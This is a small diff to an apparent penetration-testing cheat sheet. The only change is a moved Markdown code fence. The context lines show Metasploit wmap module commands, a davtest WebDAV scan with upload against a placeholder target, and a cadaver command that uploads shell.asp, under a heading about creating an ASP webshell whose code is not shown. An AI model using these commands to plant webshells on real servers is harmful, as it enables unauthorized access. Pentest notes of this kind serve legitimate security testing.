@@ -104,7 +104,7 @@ wmap_modules -l
 # Enable a specific module
 wmap_modules -e auxiliary/scanner/http/dir_scanner
 
-
+```
 # WebDAV Discovery & Upload with DAVTest
 davtest -url http://<target>/webdav/ -methods all -upload
 
@@ -112,7 +112,7 @@ davtest -url http://<target>/webdav/ -methods all -upload
 cadaver http://<target>/webdav/ << 'EOF'
 put shell.asp
 EOF
-```
+
 
 # Create ASP Webshell (shell.asp)
 
